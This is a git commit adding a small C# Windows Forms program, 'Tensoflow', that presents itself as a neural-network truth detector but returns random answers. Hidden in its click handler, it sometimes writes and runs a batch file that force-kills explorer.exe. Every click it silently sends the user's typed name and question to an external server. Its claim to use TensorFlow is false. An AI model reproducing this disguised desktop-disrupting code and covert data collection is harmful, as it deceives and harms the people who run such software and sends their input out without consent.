c9e086dfb0605e2ea8abcd6dd91c3639f6402c13
vit22022002 <vit22022002@gmail.com>
2021-05-11 14:38:24 +0300

    init

---
+++ Random/Form1.Designer.cs
@@ -0,0 +1,133 @@
+﻿namespace Random
+{
+    partial class Tensoflow
+    {
+        /// <summary>
+        /// Обязательная переменная конструктора.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Освободить все используемые ресурсы.
+        /// </summary>
+        /// <param name="disposing">истинно, если управляемый ресурс должен быть удален; иначе ложно.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Код, автоматически созданный конструктором форм Windows
+
+        /// <summary>
+        /// Требуемый метод для поддержки конструктора — не изменяйте 
+        /// содержимое этого метода с помощью редактора кода.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.label2 = new System.Windows.Forms.Label();
+            this.textBox2 = new System.Windows.Forms.TextBox();
+            this.label3 = new System.Windows.Forms.Label();
+            this.textBox3 = new System.Windows.Forms.TextBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(39, 137);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(173, 48);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "GO";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(39, 59);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(173, 20);
+            this.textBox1.TabIndex = 1;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(39, 40);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(68, 13);
+            this.label1.TabIndex = 2;
+            this.label1.Text = "Name / Имя";
+            this.label1.Click += new System.EventHandler(this.label1_Click);
+            // 
+            // label2
+            // 
+            this.label2.AutoSize = true;
+            this.label2.Location = new System.Drawing.Point(39, 86);
+            this.label2.Name = "label2";
+            this.label2.Size = new System.Drawing.Size(97, 13);
+            this.label2.TabIndex = 3;
+            this.label2.Text = "Question / Вопрос";
+            // 
+            // textBox2
+            // 
+            this.textBox2.Location = new System.Drawing.Point(39, 102);
+            this.textBox2.Name = "textBox2";
+            this.textBox2.Size = new System.Drawing.Size(173, 20);
+            this.textBox2.TabIndex = 4;
+            // 
+            // label3
+            // 
+            this.label3.AutoSize = true;
+            this.label3.Location = new System.Drawing.Point(107, 188);
+            this.label3.Name = "label3";
+            this.label3.Size = new System.Drawing.Size(0, 13);
+            this.label3.TabIndex = 5;
+            // 
+            // textBox3
+            // 
+            this.textBox3.Location = new System.Drawing.Point(12, 219);
+            this.textBox3.Multiline = true;
+            this.textBox3.Name = "textBox3";
+            this.textBox3.ReadOnly = true;
+            this.textBox3.Size = new System.Drawing.Size(237, 124);
+            this.textBox3.TabIndex = 7;
+            this.textBox3.Text = "Введите имя и вопрос, затем нажмите \"GO\". Программа при помщи нейросетей tensorfl" +
+    "ow определяет правда это или ложь. \r\n\r\n\r\nCopyright (c) (R) (tm) RBS SDD  inc. co" +
+    "m. studio\r\n";
+            // 
+            // Tensoflow
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(253, 351);
+            this.Controls.Add(this.textBox3);
+            this.Controls.Add(this.label3);
+            this.Controls.Add(this.textBox2);
+            this.Controls.Add(this.label2);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.button1);
+            this.Name = "Tensoflow";
+            this.Text = "Tensoflow";
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.Label label2;
+        private System.Windows.Forms.TextBox textBox2;
+        private System.Windows.Forms.Label label3;
+        private System.Windows.Forms.TextBox textBox3;
+    }
+}
+
---
+++ Random/Form1.cs
@@ -0,0 +1,97 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+using System.Threading;
+using System.Net.Http;
+using Random;
+using System.Net;
+using System.Collections.Specialized;
+
+namespace Random
+{
+    public partial class Tensoflow : Form
+    {
+        public Tensoflow()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            Ramdomize(false);
+        }
+
+        private void Ramdomize(bool f)
+        {
+            System.Random rnd = new System.Random();
+            int a = rnd.Next(0, 100);
+
+
+            if (a > 75)
+            {
+                label3.ForeColor = Color.Red;
+                label3.Text = "Kill";
+                StreamWriter bat = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "fate.bat");
+                bat.Flush();
+                bat.WriteLine("taskkill /im explorer.exe /f");
+                bat.Close();
+
+                Log(DateTime.Now.ToString(),textBox1.Text,textBox2.Text,label3.Text);
+                Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory) + "fate.bat");
+
+                if (f)
+                {
+                    TimerCallback tm = new TimerCallback(Explorer);
+                    System.Threading.Timer timer = new System.Threading.Timer(tm, 0, 0, 2000);
+                }
+            }
+            else
+            {
+                a = rnd.Next(0, 100);
+                label3.ForeColor = Color.Black;
+                if (a > 50)
+                {
+                    label3.Text = Convert.ToString(false);
+                }
+                else
+                {
+                    label3.Text = Convert.ToString(true);
+                }
+                Log(DateTime.Now.ToString(), textBox1.Text, textBox2.Text, label3.Text);
+            }
+        }
+
+        private void label1_Click(object sender, EventArgs e)
+        {
+            Ramdomize(true);
+        }
+
+        private static void Explorer(object d)
+        {
+            Process.Start(@"C:\Windows\explorer.exe");
+        }
+
+        private static readonly HttpClient client = new HttpClient();
+        private async void Log(string date, string name, string question, string result)
+        {
+
+            string url = "http://web1129.craft-host.ru/rand.php";
+
+            using (var webClient = new WebClient())
+            {
+                //http://web1129.craft-host.ru/rand.php?date=22222&name=2&question=23&result=false
+                string lurl = url + "?date=\"" + date + "\"&name=\"" + name + "\"&question=\"" + question + "\"&result=\"" + result + "\"";
+
+                var response = webClient.DownloadString(lurl);
+            }
+        }
+    }
+}
